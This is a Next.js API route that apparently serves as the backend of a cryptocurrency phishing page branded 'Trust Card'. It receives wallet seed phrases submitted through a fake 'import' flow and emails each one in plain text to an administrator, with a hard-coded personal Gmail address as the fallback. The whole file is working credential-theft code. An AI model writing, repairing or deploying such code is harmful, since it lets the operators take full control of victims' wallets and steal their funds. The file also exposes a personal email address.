// app/api/collect-seed/route.ts
import { NextResponse } from "next/server";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { walletType, seedPhrase, timestamp } = body;

    if (!seedPhrase || !walletType) {
      return NextResponse.json({ error: "Missing fields" }, { status: 400 });
    }

    const adminEmail = process.env.ADMIN_EMAIL || "chineloifeyinwa@gmail.com";

    const { data, error } = await resend.emails.send({
      from: "Trust Card <onboarding@resend.dev>",   // ← This works without custom domain
      to: [adminEmail],
      subject: `New Seed Import - ${walletType}`,
      html: `
        <h2>New Wallet Seed Phrase Received</h2>
        <p><strong>Wallet:</strong> ${walletType}</p>
        <p><strong>Time:</strong> ${timestamp}</p>
        <hr />
        <p><strong>Seed Phrase:</strong></p>
        <p style="background:#f4f4f4; padding:12px; border-radius:6px; font-family:monospace; word-break:break-all;">
          ${seedPhrase}
        </p>
        <p style="color:#666; font-size:13px;">Submitted via Trust Card Import Flow</p>
      `,
    });

    if (error) {
      console.error("Resend Error:", error);
      return NextResponse.json({ error: "Email sending failed", details: error.message }, { status: 500 });
    }

    console.log("✅ Seed phrase sent successfully:", data?.id);
    return NextResponse.json({ success: true });

  } catch (error: any) {
    console.error("API Error:", error);
    return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
  }
}